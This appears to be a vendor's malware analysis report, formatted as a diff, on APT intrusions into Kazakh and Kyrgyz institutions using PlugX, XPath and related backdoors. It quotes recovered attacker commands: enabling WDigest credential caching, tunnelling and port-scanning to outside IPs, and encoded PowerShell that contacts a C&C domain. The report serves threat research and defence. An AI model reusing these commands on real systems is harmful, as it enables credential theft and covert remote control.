@@ -1,0 +1,163 @@
+General Information About the Attack and Tools
+We were able to study in detail the information from several network servers of the effected
+institutions in Kazakhstan and Kyrgyzstan. All devices covered in the study run Microsoft
+Windows operating systems.
+Malware used in the targeted attack can be divided into two categories:
+
+
+Common ones installed on most network computers;
+
+
+Specialized ones installed on servers of special interest to the attacker.
+
+
+The analyzed malware samples and utilities used by attackers allow us to assume the
+following attack scenario. After successfully exploiting the vulnerabilities and gaining access
+to the network computer, hackers uploaded one of the BackDoor.PlugX modifications to it.
+The trojan's payload modules allowed attackers to remotely control an infected computer
+and use it for lateral movement. Another trojan, presumably used for initial infection, was
+BackDoor.Whitebird.1. This backdoor was designed to operate in 64-bit operating systems
+and had a universal functionality: supporting an encrypted connection to the C&C server, as
+well as the file manager, proxy, and for remote control via the command shell functionality.
+After achieving a network presence, attackers used specialized malware to carry out their
+tasks. This is how specialized trojan programs are distributed among infected devices.
+|Domain controller #1|Trojan.MisicsTrojan.XPath|
+|---|---|
+|Domain controller #2|Trojan.MisicsTrojan.Mirage|
+|Domain controller #3|BackDoor.MikroceenBackDoor.Logtu|
+|Server #1|BackDoor.Mikroceen|
+|Server #2|Trojan.MirageBackDoor.CmdUdp.1|
+The most interesting finding is the XPath family, whose modifications, according to our
+information, have not been publicly described before. The family has a rootkit for hiding
+network activity and traces of presence in a compromised system, which was detected by the
+Dr.Web anti-rootkit installed on the attacked server. The samples we studied were compiled
+between 2017-2018. With that, these malicious programs are based on open source projects
+released several years earlier. Thus, the studied samples used versions of the WinDivert
+package released between 2013-2015. This indirectly indicates the first XPath modifications
+may also have been developed during this period.
+XPath is a module trojan, each component of which corresponds to a specific stage of
+malware operation. The infection process begins with the installer operation, detected as
+Trojan.XPath.1. The installer uses an encrypted configuration hardcoded in its body and
+launches the payload either by driver installation or by utilizing COM Hijacking. The program
+uses the system registry to store its modules, using both encryption and data compression.
+Trojan.XPath.2 is a driver and hides malicious activity in a compromised system by running
+another module simultaneously. The driver has Chinese digital signatures. Its operation is
+based on open source projects. Unlike other components stored in the system registry, the
+driver files are located on a disk, and the malicious program runs covertly. In addition to
+hiding the driver file on the disk, the component is also designed for injecting the payload’s
+loader in the lsass.exe process, as well as concealing the trojan's network activity. The
+operating scenario varies depending on the operating system version.
+PayloadDll.c is the original name for the third component. A library detected as
+Trojan.XPath.3 is an intermediate module that injects the payload, saved in the system
+registry, into the svhost.exe process by utilizing COM Hijacking.
+The main functionality is contained in the payload module detected as Trojan.XPath.4. The
+component is written in C++, and is also based on open source projects. Similar to most of
+the malware analyzed in this study, this trojan is designed to gain unauthorized access to
+infected computers and steal confidential data. Its key feature is the ability to operate in two
+modes. The first is the Client Mode. In this mode, the trojan connects to the C&C server and
+waits for incoming commands. The second is the Agent Mode. In this mode, Trojan.XPath.4
+carries server functions: it listens for certain ports, waits for other clients to connect to them,
+and sends commands to these clients. Thus, the malware creators have provided the
+possibility for deploying a local C&C server inside the attacked network to redirect
+commands from an external C&C server to infected computers inside the network.
+For a detailed description of the XPath family and how it works, see Operating Routine of
+Discovered Malware Samples.
+Another interesting finding is the Trojan.Mirage access implementation to the command
+shell. To perform command shell I/O redirections, the malware used files that we were able
+to retrieve from an infected server during the investigation. With them we managed to see
+the commands executed by cybercriminals using the following trojan function, as well as the
+data received in response:
+```
+ reg add HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Wdigest
+ /v UseLogonCredential /t REG_DWORD /d 1 /f
+ ipconfig /displaydns
+ c:\windows\debug\windbg.exe -n 202.74.232.2 -o 53,80,443
+ c:\windows\debug\windbg.exe -n 202.74.232.2 -o 143,110
+```
+```
+ reg query
+ HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Wdigest
+```
+The launched windbg.exe file was a TCP/UPD port scanner utility called PortQry.
+During our investigation, we found evidence indirectly confirming the connection of
+targeted attacks on institutions of Central Asian republics. One of the uncovered samples
+called BackDoor.PlugX.38 used the nicodonald[.]accesscam[.]org domain, which was also
+used as the C&C server for BackDoor.Apper.14, also known as ICEFOG NG. A few years ago,
+we discovered a backdoor of this family in a phishing email sent to one of the state
+institutions in Kazakhstan. Also, an RTF document that installs this sample of
+BackDoor.Apper.14 was first uploaded to VirusTotal from Kazakhstan on March 19, 2019.
+An interesting finding within the framework of the Kyrgyzstan incident is the Logtu backdoor
+found on an infected server along with the Mikroceen backdoor. In addition to a similar set
+of malware used by attackers in both incidents, Mikroceen points to a possible connection
+between the two attacks: a sample of this highly specialized backdoor was found on both
+networks and in both cases it was installed on the domain controller.
+During the search for samples related to these attacks, we found a specially made backdoor
+that implements BIND Shell access to the command shell. The program’s debugging
+information contains the project name in Chinese,, which may indicate the
+trojan’s origin.
+In addition to malicious programs, attackers used the following publicly available utilities
+for lateral movement within the network:
+
+Mimikatz
+
+TCP Port Scanner V1.2 By WinEggDrop
+
+
+Nbtscan
+
+
+PsExec
+
+
+wmiexec.vbs
+
+
+goMS17-010
+
+
+ZXPortMap v1.0 By LZX
+
+
+Earthworm
+
+
+PortQry version 2.0 GOLD
+Examples of launching some of the listed utilities are shown below.
+
+
+ZXPortMap: vmwared.exe 21 46.105.227.110 53
+
+
+Earthworm: cryptsocket.exe -s rssocks -d 137.175.79.212 -e 53
+
+
+The APT group also actively used its own PowerShell scripts to perform various tasks, such as
+collecting information about an infected computer and other network devices, checking the
+C&C server status from an infected computer, etc. In addition, we found a PowerShell script
+designed for downloading all the contents from the Microsoft Exchange Server mailboxes of
+several of the organization’s employees.
+Examples of certain PowerShell scripts executed on infected servers:
+```
+ powershell -enc
+DQAKADUAMwAsADMAOAA5ACAAfAAgACUAewBlAGMAaABvACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOA
+GUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAApAC4AQwBvAG4AbgBlAGMAdAAoACIAdg
+AuAG4AbgBuAGMAaQB0AHkALgB4AHkAegAiACwAJABfACkAKQAgACIAUABvAHIAdAAgACQAaQAgAGkAcwAgAG8
+AcABlAG4AIQAiAH0AIAAyAD4AJABuAHUAbABsAA0ACgA=
+powershell -nop -enc
+DQAKADIAMQAsADIAMgAsADIANQAgAHwAIAAlAHsAZQBjAGgAbwAgACgAKABuAGUAdwAtAG8AYgBqAGUAYwB0A
+CAATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABjAHAAQwBsAGkAZQBuAHQAKQAuAEMAbwBuAG4AZQBjAHQAKA
+AiAHYALgBuAG4AbgBjAGkAdAB5AC4AeAB5AHoAIgAsACQAXwApACkAIAAiAFAAbwByAHQAIAAkAGkAIABpAHM
+AIABvAHAAZQBuACEAIgB9ACAAMgA+ACQAbgB1AGwAbAANAAoA
+powershell -enc
+IAA1ADMALAA1ADQALAA4ADAALAA0ADQAMwAgAHwAIAAlAHsAZQBjAGgAbwAgACgAKABuAGUAdwAtAG8AYgBqA
+GUAYwB0ACAATgBlAHQALgBTAG8AYwBrAGUAdABzAC4AVABjAHAAQwBsAGkAZQBuAHQAKQAuAEMAbwBuAG4AZQ
+BjAHQAKAAiAHYALgBuAG4AbgBjAGkAdAB5AC4AeAB5AHoAIgAsACQAXwApACkAIAAiAFAAbwByAHQAIAAkAGk
+AIABpAHMAIABvAHAAZQBuACEAIgB9ACAAMgA+ACQAbgB1AGwAbAANAAoA
+powershell.exe -executionpolicy bypass -WindowStyle Hidden -File C:\programdata\x.ps1
+ %COMSPEC% /Q /c tasklist /v >>c:\programdata\2.txt
+ %COMSPEC% /Q /c systeminfo >>c:\programdata\2.txt
+ %COMSPEC% /Q /c netstat -nvb  >> c:\programdata\2.txt
+ powershell -exec bypass -command "& { foreach($i in 53,80,443){ echo ((new-object
+ Net.Sockets.TcpClient).Connect('v.nnncity.xyz',$i)) "port:"$i } 2 > $null }" >>c:
+ \programdata\2.txt
+```
